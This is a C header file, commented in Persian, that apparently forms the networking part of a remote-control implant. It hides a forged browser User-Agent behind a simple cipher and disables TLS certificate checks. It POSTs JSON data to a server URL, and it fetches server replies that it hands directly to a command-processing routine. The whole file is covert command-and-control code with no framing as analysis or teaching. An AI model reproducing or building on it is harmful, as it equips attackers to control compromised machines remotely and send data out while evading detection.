#ifndef SENDREQ
#define SENDREQ

#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include "proccesscommand.h"
#include "encode.h"

int send_json_string(const char* json_string, const char* target_url) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;

    // رمزگشایی User-Agent
    char userAgent[] = "Ln{hmm`.4/1!)qm`ugnsl:!sw;fdbjn,wdsrhno(!Fdbjn.fdbjn,us`hm!Ghsdgny.ghsdgny,wdsrhno";
    simple_cipher(userAgent);

    curl = curl_easy_init();
    if (!curl) return -1;

    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, target_url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgent);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_string);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_string));
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // مهم: پاسخ سرور را نادیده بگیر
    curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);  // فقط برای اطمینان
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);  // پاسخ را نادیده بگیر
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);

    res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? 0 : -1;
}

size_t reciveData(char *response, size_t size, size_t memb, void *option)
{
    printf("* connect to server is succsessfully\n");
    size_t dataSize = size * memb;
    proccess_command(response, size * memb);
    return size * memb;
}

int send_request(const char* target_url)
{
    CURL *curl;
    CURLcode result;

    char userAgent[] = "Ln{hmm`.4/1!)qm`ugnsl:!sw;fdbjn,wdsrhno(!Fdbjn.fdbjn,us`hm!Ghsdgny.ghsdgny,wdsrhno";
    simple_cipher(userAgent);

    curl = curl_easy_init();

    curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgent);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, target_url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, reciveData);

    result = curl_easy_perform(curl);
    if (result != CURLE_OK)
    {
        printf("error: %s\n", curl_easy_strerror(result));
        curl_easy_cleanup(curl);
        return -1;
    }

    curl_easy_cleanup(curl);

    return 0;
}

#endif // SENDREQ